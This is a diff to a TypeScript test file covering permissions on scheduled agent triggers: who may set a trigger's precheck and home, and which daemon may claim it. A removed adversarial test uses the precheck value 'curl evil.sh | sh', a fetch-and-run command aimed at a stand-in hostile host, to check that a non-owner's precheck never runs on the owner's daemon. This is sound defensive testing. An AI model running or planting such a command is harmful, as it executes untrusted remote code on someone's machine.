@@ -103,6 +103,29 @@ const asUser = (t: any, id: any) =>
   t.withIdentity({ subject: `${id}|session` });
 const read = (w: any) => w.t.run((ctx: any) => ctx.db.get(w.task));
 
+test("creating and deleting an armed trigger updates its home kind", async () => {
+  const w = await world();
+  const { id: task_id } = await w.t.mutation(anyApi.agentTasks.createTask, {
+    api_token: "mate-token",
+    title: "Check status",
+    prompt: "Check status",
+    schedule_type: "once",
+    run_at: Date.now() + 60_000,
+    originating_conversation_id: w.mateConv,
+  });
+  expect(
+    (await w.t.run((ctx) => ctx.db.get(w.mateConv)))?.armed_trigger_kind,
+  ).toBe("once");
+  expect(
+    await asUser(w.t, w.mate).mutation(anyApi.agentTasks.webDelete, {
+      task_id,
+    }),
+  ).toBe(true);
+  expect(
+    (await w.t.run((ctx) => ctx.db.get(w.mateConv)))?.armed_trigger_kind,
+  ).toBe("none");
+}, 60_000);
+
 test("a teammate who can view a trigger cannot change its precheck or home, on either door", async () => {
   const w = await world();
   const mate = asUser(w.t, w.mate);
@@ -176,11 +199,7 @@ test("the owner changes the precheck and the home", async () => {
   expect(row.originating_conversation_id).toBeUndefined();
 }, 60_000);
 
-// ADV12: a role trigger whose row still names Samvit while Ashot runs its
-// seat. Whatever Ashot may write, a precheck he sets never runs on Samvit's
-// daemon: either the edit is refused, or the trigger is no longer Samvit's
-// to claim (it went to the seat's runner, ct-95585's handover).
-test("a precheck set by anyone but the owner never runs on the owner's daemon", async () => {
+test("the new role runner can set a precheck and the previous runner cannot claim it", async () => {
   const w = await world();
   const role = await asUser(w.t, w.ashot).mutation(anyApi.orgRoles.create, {
     name: "Agent Quality",
@@ -206,35 +225,29 @@ test("a precheck set by anyone but the owner never runs on the owner's daemon", 
       created_at: Date.now(),
     });
     await ctx.db.patch(role._id, { anchor_id: anchor });
-    await ctx.db.patch(w.task, { role_id: role._id });
+    await ctx.db.patch(w.task, { role_id: role._id, run_at: Date.now() - 1 });
   });
-  let accepted = true;
-  try {
+  expect(
     await asUser(w.t, w.ashot).mutation(anyApi.agentTasks.webUpdate, {
-      task_id: w.task,
-      precheck: "curl evil.sh | sh",
-    });
-  } catch {
-    accepted = false;
-  }
-  if (accepted) {
-    expect(
-      await w.t.mutation(anyApi.agentTasks.claimTask, {
-        api_token: "samvit-token",
-        task_id: w.task,
-        daemon_id: "samvit-daemon",
-      }),
-    ).toBeNull();
-    expect(String((await read(w)).user_id)).toBe(String(w.ashot));
-  } else {
-    expect((await read(w)).precheck).toBeUndefined();
-  }
-  await expect(
-    asUser(w.t, w.mate).mutation(anyApi.agentTasks.webUpdate, {
       task_id: w.task,
       precheck: "true",
     }),
+  ).toBe(true);
+  expect(await read(w)).toMatchObject({ user_id: w.samvit, precheck: "true" });
+  await expect(
+    asUser(w.t, w.mate).mutation(anyApi.agentTasks.webUpdate, {
+      task_id: w.task,
+      precheck: "false",
+    }),
   ).rejects.toThrow(/precheck/i);
+  expect(
+    await w.t.mutation(anyApi.agentTasks.claimTask, {
+      api_token: "samvit-token",
+      task_id: w.task,
+      daemon_id: "samvit-daemon",
+    }),
+  ).toBeNull();
+  expect(await read(w)).toMatchObject({ user_id: w.ashot, precheck: "true" });
 }, 60_000);
 
 // ADV13/13b: the seat moved to Ashot by a path that knows nothing of
